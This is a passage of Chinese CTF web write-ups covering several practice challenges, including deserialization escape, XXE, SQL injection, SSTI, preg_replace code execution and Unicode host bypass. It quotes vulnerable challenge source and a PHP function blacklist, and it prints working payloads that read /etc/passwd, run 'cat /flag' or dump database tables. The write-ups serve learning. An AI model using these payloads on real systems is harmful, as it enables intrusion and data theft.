src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw00ja2x4j30vw0eata4.jpg" alt=""><br>看到有时间，修改时间为很大的值，显示要来自localhost才行。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giw03mnmyuj30yb0c7jsh.jpg" alt=""><br>发现X-Forwarded-For被检测到了，百度一下知道了另一个方法。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw05ieajnj30xh0czmya.jpg" alt=""><br>使用Client-ip。提示要来自gem-love.com。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw08ltjaaj30x90bzjsg.jpg" alt=""><br>用Referer绕过。接着提示需要Commodo 64浏览器。但是直接修改User-Agent为Commodo 64。现在不对，查了一下全称是Commodore 64。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw0d90k2ij30x80e43zz.jpg" alt=""><br>需要我们的邮箱是：<a href="mailto:root@gem-love.com">root@gem-love.com</a>。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw0ehexn7j30y80bz0ty.jpg" alt=""><br>使用From。发现又需要代理服务地址是y1ng.vip。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw0gqcbmhj30xy0cadh5.jpg" alt=""><br>使用via。从而获得flag。</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>尝试注入，发现并不行，所以觉得应该不是SQL注入，利用dirsearch扫描。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw19f319qj30ai04kt8r.jpg" alt=""><br>发现页面备份文件<a href="http://www.zip。" target="_blank" rel="noopener">www.zip。</a><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giw1ma6qwaj30lx09ejrz.jpg" alt=""><br>下载后即可看到题目的源码。</p><p>update.php</p><pre><code>&lt;?php    require_once(&apos;class.php&apos;);    if($_SESSION[&apos;username&apos;] == null) {        die(&apos;Login First&apos;);        }    if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) {        $username = $_SESSION[&apos;username&apos;];        if(!preg_match(&apos;/^\d{11}$/&apos;, $_POST[&apos;phone&apos;]))            die(&apos;Invalid phone&apos;);        if(!preg_match(&apos;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&apos;, $_POST[&apos;email&apos;]))            die(&apos;Invalid email&apos;);        if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)            die(&apos;Invalid nickname&apos;);        $file = $_FILES[&apos;photo&apos;];        if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)            die(&apos;Photo size error&apos;);        move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));        $profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];        $profile[&apos;email&apos;] = $_POST[&apos;email&apos;];        $profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];        $profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);        $user-&gt;update_profile($username, serialize($profile));        echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;    }    else {?&gt;</code></pre><p>通过正则匹配来过滤我们提交的数据，判断nickname这里判断了nickname是否为字符以及长度是否超过10，这里如果传入的nickname是一个数组，则可以绕过长度的限制。代码最后调用了update_profile函数，应该是把$user放进数据库里面。</p><p>class.php</p><pre><code>&lt;?phprequire(&apos;config.php&apos;);class user extends mysql{    private $table = &apos;users&apos;;    public function is_exists($username) {        $username = parent::filter($username);        $where = &quot;username = &apos;$username&apos;&quot;;        return parent::select($this-&gt;table, $where);    }    public function register($username, $password) {        $username = parent::filter($username);        $password = parent::filter($password);        $key_list = Array(&apos;username&apos;, &apos;password&apos;);        $value_list = Array($username, md5($password));        return parent::insert($this-&gt;table, $key_list, $value_list);    }    public function login($username, $password) {        $username = parent::filter($username);        $password = parent::filter($password);        $where = &quot;username = &apos;$username&apos;&quot;;        $object = parent::select($this-&gt;table, $where);        if ($object &amp;&amp; $object-&gt;password === md5($password)) {            return true;        } else {            return false;        }    }    public function show_profile($username) {        $username = parent::filter($username);        $where = &quot;username = &apos;$username&apos;&quot;;        $object = parent::select($this-&gt;table, $where);        return $object-&gt;profile;    }    public function update_profile($username, $new_profile) {        $username = parent::filter($username);        $new_profile = parent::filter($new_profile);        $where = &quot;username = &apos;$username&apos;&quot;;        return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);    }    public function __tostring() {        return __class__;    }}class mysql {    private $link = null;    public function connect($config) {        $this-&gt;link = mysql_connect(            $config[&apos;hostname&apos;],            $config[&apos;username&apos;],             $config[&apos;password&apos;]        );        mysql_select_db($config[&apos;database&apos;]);        mysql_query(&quot;SET sql_mode=&apos;strict_all_tables&apos;&quot;);        return $this-&gt;link;    }    public function select($table, $where, $ret = &apos;*&apos;) {        $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;        $result = mysql_query($sql, $this-&gt;link);        return mysql_fetch_object($result);    }    public function insert($table, $key_list, $value_list) {        $key = implode(&apos;,&apos;, $key_list);        $value = &apos;\&apos;&apos; . implode(&apos;\&apos;,\&apos;&apos;, $value_list) . &apos;\&apos;&apos;;         $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;        return mysql_query($sql);    }    public function update($table, $key, $value, $where) {        $sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;        return mysql_query($sql);    }    public function filter($string) {        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;        $string = preg_replace($escape, &apos;_&apos;, $string);        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;        return preg_replace($safe, &apos;hacker&apos;, $string);    }    public function __tostring() {        return __class__;    }}session_start();$user = new user();$user-&gt;connect($config);</code></pre><p>在class.php中可以看到update_profile()的方法。</p><pre><code>public function update_profile($username, $new_profile) {        $username = parent::filter($username);        $new_profile = parent::filter($new_profile);        $where = &quot;username = &apos;$username&apos;&quot;;        return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);    }</code></pre><p>update_profile()中使用了mysql类中的filter()函数和update()函数。</p><p>filter()</p><pre><code>public function filter($string) {        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;        $string = preg_replace($escape, &apos;_&apos;, $string);        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;        return preg_replace($safe, &apos;hacker&apos;, $string);    }</code></pre><p>update()</p><pre><code>public function update($table, $key, $value, $where) {        $sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;        return mysql_query($sql);    }</code></pre><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giw4n6ec6nj30l70ctjrw.jpg" alt=""><br>所以update.php就是对输入的参数进行过滤，然后序列化，将序列化的字符中的’和\替换为_，将select，insert，update，delete和where替换为hacker。</p><p>profile.php</p><pre><code>&lt;?php    require_once(&apos;class.php&apos;);    if($_SESSION[&apos;username&apos;] == null) {        die(&apos;Login First&apos;);        }    $username = $_SESSION[&apos;username&apos;];    $profile=$user-&gt;show_profile($username);    if($profile  == null) {        header(&apos;Location: update.php&apos;);    }    else {        $profile = unserialize($profile);        $phone = $profile[&apos;phone&apos;];        $email = $profile[&apos;email&apos;];        $nickname = $profile[&apos;nickname&apos;];        $photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));?&gt;</code></pre><p>这里将信息反序列化，还会读取上传的文件。</p><p>config.php</p><pre><code>&lt;?php    $config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;    $config[&apos;username&apos;] = &apos;root&apos;;    $config[&apos;password&apos;] = &apos;&apos;;    $config[&apos;database&apos;] = &apos;&apos;;    $flag = &apos;&apos;;?&gt;</code></pre><p>很明显。flag是在config.php中，所以我们要构造包含config.php的数据，利用字符串逃逸。</p><p>反序化是以”;}结束的，我们可以把”;}加到需要反序化的字符中，就可以提前结束;}之后的内容。而update.php将参数序列化，序列化的字符和长度不可控，但是我们可以利用class.php中的filter()函数。</p><pre><code>public function filter($string) {        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;        $string = preg_replace($escape, &apos;_&apos;, $string);        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;        return preg_replace($safe, &apos;hacker&apos;, $string);    }</code></pre><p>这里是将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，<br>因为where是5个字符，而hacker是6个字符。因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。</p><p>我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个字符串的长度是34位，所以需要构造34个where，当替换成hacker时就会多出34位将插入的字符挤出去，这样插入的字符就不是nickname的值，从而将photo的值修改为config.php，最后就会执行file_get_content(config.php)命令从而获得flag。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giw64s1xwsj30yq0i0go2.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giw651g7b6j30yn0getbo.jpg" alt=""><br>最后在profile.php获得flag。<br>参考:<a href="https://www.cnblogs.com/g0udan/p/12216207.html" target="_blank" rel="noopener">https://www.cnblogs.com/g0udan/p/12216207.html</a></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>题目提示ip，所以想到X-Forwarded-For。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giw9diu7wsj310s0cxt9s.jpg" alt=""><br>修改X-Forwarded-For发现题目显示的ip值也改变了，说明是可控的。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giw9g518nij30wl0cvdgv.jpg" alt=""><br>经测试发现存在ssti注入漏洞。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giw9hc2xetj30t50c0aam.jpg" alt=""><br>执行命令，在根目录下发现flag。<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giw9i7crb0j310409kjs5.jpg" alt=""><br>使用cat /flag获得flag。</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giwacezpdej315f0mlqdq.jpg" alt=""><br>出自2019blackhat的议题</p><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><pre><code>@app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def getUrl():    url = request.args.get(&quot;url&quot;)    host = parse.urlparse(url).hostname    if host == &apos;suctf.cc&apos;:        return &quot;我扌 your problem? 111&quot;    parts = list(urlsplit(url))    host = parts[1]    if host == &apos;suctf.cc&apos;:           return &quot;我扌 your problem? 222 &quot; + host    newhost = []    for h in host.split(&apos;.&apos;):           newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))    parts[1] = &apos;.&apos;.join(newhost)    #去掉 url 中的空格    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &apos;suctf.cc&apos;:        return urllib.request.urlopen(finalUrl).read()    else:        return &quot;我扌 your problem? 333&quot;</code></pre><p>题目源码，其中三个if判断语句条件都是一样的，但是每一个host的构造都是不一样的。</p><p>当URL 中出现一些特殊字符的时候，输出的结果可能不在预期</p><p>所以g按照etUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():for x in range(65536):uni=chr(x)url=&quot;http://suctf.c{}&quot;.format(uni)try:if getUrl(url):print(&quot;str: &quot;+uni+&apos; unicode: \\u&apos;+str(hex(x))[2:])except:passdef getUrl(url):url=urlhost=parse.urlparse(url).hostnameif host == &apos;suctf.cc&apos;:return Falseparts=list(urlsplit(url))host=parts[1]if host == &apos;suctf.cc&apos;:return Falsenewhost=[]for h in host.split(&apos;.&apos;):newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))parts[1]=&apos;.&apos;.join(newhost)finalUrl=urlunsplit(parts).split(&apos; &apos;)[0]host=parse.urlparse(finalUrl).hostnameif host == &apos;suctf.cc&apos;:return Trueelse:return Falseif __name__==&apos;__main__&apos;:get_unicode()</code></pre><p>脚本是参考下方博客的。</p><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giwb2h6cqpj30f907q3yr.jpg" alt=""></p><p>只需要其中任意一个就能读取文件了。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giwb87ii64j31f50jsabj.jpg" alt=""><br>题目提示我们是nginx，所以我们去读取nginx的配置文件，题目就提示了flag的位置。<br>构造payload:getUrl?url=file://suctf.cℂ/../../../../..//usr/fffffflag即可获得flag。</p><p>部分nginx的配置文件所在位置</p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx</code></pre><p>参考：<a href="https://www.cnblogs.com/Cl0ud/p/12187204.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12187204.html</a></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giwbxsv144j30l90c4mxy.jpg" alt=""><br>阅读代码发现和之前做过的[ZJCTF 2019]NiZhuanSiWei类似，直接构造payload:</p><pre><code>?file=php://filter/convert.base64-encode/resource=next.php&amp;text=data:text/plain;base64,SSBoYXZlIGEgZHJlYW0=</code></pre><p>读取next.php中的内容。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giwc0ikop9j31hc09tt96.jpg" alt=""></p><pre><code>&lt;?php$id = $_GET[&apos;id&apos;];$_SESSION[&apos;id&apos;] = $id;function complex($re, $str) {return preg_replace(&apos;/(&apos; . $re . &apos;)/ei&apos;,&apos;strtolower(&quot;\1&quot;)&apos;,$str);}foreach($_GET as $re =&gt; $str) {echo complex($re, $str). &quot;\n&quot;;}function getFlag(){    @eval($_GET[&apos;cmd&apos;]);}</code></pre><p>base64解码后获得next.php得内容。<br>本题考查的是preg_replace /e模式下存在的命令执行漏洞。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giwdhy6onuj30r906rmxl.jpg" alt=""><br>所以不能直接构造\S*=${system(‘ls’)}，因为传参数会被替换掉，但是getFlag()函数中有@eval($_GET[‘cmd’]);可以传参数执行命令。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giwdexejulj30vs0jywfk.jpg" alt=""><br>详情见参考，所以构造payload:</p><pre><code>next.php?\S*=${getFlag()}&amp;cmd=system(&quot;cat /flag&quot;);</code></pre><p>即可获得flag。<br>参考：<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener" title="深入研究preg_replace与代码执行">https://xz.aliyun.com/t/2557</a></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giwej7gvxsj30kk01raa6.jpg" alt=""><br>打开源码，看到提示，说utf-8很重要。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giwekple72j30nd05sq2w.jpg" alt=""><br>输入的价格数字为两位以上会报错，说明价格只能为0-9，所以前三个独角兽都能买，但最后一个独角兽价格很高，可以猜测买最后一个就有flag。<br>所以需要找到一个字符，而且这个字符比1337大才行。</p><p>所以这题考查的是utf-8编码的安全转换问题。</p><p><a href="https://www.compart.com/en/unicode/" target="_blank" rel="noopener">https://www.compart.com/en/unicode/</a><br>在这个网站直接输入thousand查找。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giweyc8nj4j310a0hfwfc.jpg" alt=""><br>只要找到一个Numeric Value大于1337的字符就可以了。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giwf1f4o6lj30ki02j746.jpg" alt=""><br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giwf0lhaodj30ma04h74a.jpg" alt=""><br>将0x换成%，然后以价格的方式输入从而获得flag。</p><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>题目给出了XML，所以这题应该是XML的漏洞，查了一下，这题考查的是XXE漏洞，XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gix1ifiv2vj30qh0a5wfi.jpg" alt=""><br>抓包发现username和password都是xml格式。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gix293mnjaj30wo0fx0v1.jpg" alt=""><br>构造payload:</p><pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE note [  &lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</code></pre><p>成功显示文件的内容。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gix2aurkc8j30v70bmq48.jpg" alt=""><br>然后读取flag。</p><p>参考：<br><a href="https://www.freebuf.com/vuls/175451.html" target="_blank" rel="noopener" title="浅谈XML实体注入漏洞 ">https://www.freebuf.com/vuls/175451.html</a></p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gix36cgq2pj313g06yaai.jpg" alt=""><br>看了wp才知道这题是SQL注入，输入广告名为1’，查看广告名是报错，可见广告名处存在SQL注入漏洞。<br>经测试发现#和–都被过滤了，空格会被替换为空，所以使用’将后面的’闭合，使用<code>/**/</code>绕过空格。<br>使用<code>1&#39;/**/&#39;</code>页面恢复正常，or也被过滤了，所以只能手动探测列数。<br>经测试发现，有22列。</p><pre><code>-1&apos;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&apos;</code></pre><p>因为or被过滤，所以不能使用information_schema库。<br>但这题可以利用另外一个方法，mysql无列名注入。<br>但这题用<code>sys.schema_auto_increment_columns</code>显示没有这个表，找了一下，发现<code>mysql.innodb_table_stats</code>可以使用。<br>构造payload:</p><pre><code>-1&apos;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&apos;</code></pre><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gix76s6posj313c05jweq.jpg" alt=""><br>获得表名。<br>由于`被过滤了，所以使用别名来代替。<br>构造payload:</p><pre><code>-1&apos;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&apos;</code></pre><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gix7gv77flj316u06fwex.jpg" alt=""><br>发现就已经得到flag了。</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener" title="CTF|mysql之无列名注入">https://zhuanlan.zhihu.com/p/98206699</a><br><a href="https://www.cnblogs.com/20175211lyz/p/12184867.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12184867.html</a></p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><pre><code>&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&apos;c&apos;])){show_source(__FILE__);}else{//例子 c=20-1$content = $_GET[&apos;c&apos;];if (strlen($content) &gt;= 80) {die(&quot;太长了不会算&quot;);}$blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;];foreach ($blacklist as $blackitem) {if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) {die(&quot;请不要输入奇奇怪怪的字符&quot;);}}//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp$whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;];preg_match_all(&apos;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&apos;, $content, $used_funcs);  foreach ($used_funcs[0] as $func) {if (!in_array($func, $whitelist)) {die(&quot;请不要输入奇奇怪怪的函数&quot;);}}//帮你算出答案eval(&apos;echo &apos;.$content.&apos;;&apos;);} </code></pre><p>题目源码。<br>代码并不复杂，但是只能用题目所给的数学函数构造。<br>一种payload是：</p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</code></pre><p>解释：</p><pre><code>base_convert(37907361743,10,36) =&gt; &quot;hex2bin&quot;dechex(1598506324) =&gt; &quot;5f474554&quot;$pi=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}(($_GET){abs})  //{}可以代替[]</code></pre><p>其余方法见参考。</p><p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixaagz481j30xu0b9dh2.jpg" alt=""><br>因为49=49<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixabzbhe8j30px0hnn2g.jpg" alt=""><br>所以这里是twig.<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gixae44dnpj30yc0a4q3x.jpg" alt=""><br>所以构造payload:</p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre><p>成功执行，回显id。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gixafsp7zjj30x10af75b.jpg" alt=""><br>最后构造payload:</p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><p>获得flag</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener" title="服务端模板注入攻击">https://zhuanlan.zhihu.com/p/28823933</a></p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><pre><code>import flaskimport osapp = flask.Flask(__name__)app.config[&apos;FLAG&apos;] = os.environ.pop(&apos;FLAG&apos;)//注册一个名为FLAG的config,猜测就是flag。@app.route(&apos;/&apos;)def index():    return open(__file__).read()@app.route(&apos;/shrine/&lt;path:shrine&gt;&apos;)def shrine(shrine):    def safe_jinja(s):        s = s.replace(&apos;(&apos;, &apos;&apos;).replace(&apos;)&apos;, &apos;&apos;)        blacklist = [&apos;config&apos;, &apos;self&apos;]        return &apos;&apos;.join([&apos;{{% set {}=None%}}&apos;.format(c) for c in blacklist]) + s//把黑名单的东西遍历并设为空。return flask.render_template_string(safe_jinja(shrine))//进行模块渲染if __name__ == &apos;__main__&apos;:    app.run(debug=True)</code></pre><p>题目给出了源码。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gixabzbhe8j30px0hnn2g.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giyb3he3waj30oh0kegmb.jpg" alt=""><br>代码中有jinjia的字样，而且导入了flask模块，所以可以猜测是flask/jinja2模板注入,经测试果然是jinja2模板注入。</p><p>利用tplmap这个工具进行检测是否有模板注入漏洞</p><p>题目将config过滤了，所以不能使用 <code>/shrine/</code>,不过python还有一些内置函数，比如 <code>url_for</code>和  <code>get_flashed_messages。</code><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giydg9vtgej31gc0kcdmd.jpg" alt=""><br>利用 <code>/shrine/</code>看到所有app的config。<br>这里面有一个current_app就是当前app的意思。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giydlam5nqj31gw0kk410.jpg" alt=""><br>flag就在当前app的config中。</p><p>另外一种就是用<code>get_flashed_messages。</code><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giydn6p96ij31hc0kq412.jpg" alt=""><br>同样可以获得flag。</p><p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a></p><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giye1jyf12j30jm06wn14.jpg" alt=""><br>进去看到页面出现警告，并且显示的时间一直在改变。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giye2exny9j30h106u749.jpg" alt=""><br>抓包可以看到post了两个参数，可以知道func的是函数，p是该函数的参数，所以是运行上传的函数。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giye53jtckj30sl08iglv.jpg" alt=""><br>尝试运行eval(system(‘ls’))，发现被检测出来了。试一下读取题目的源码。<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giye8jkf9hj30yk0bemyf.jpg" alt=""><br>使用file_get_contents(index.php)读取到题目的源码。</p><pre><code>&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, 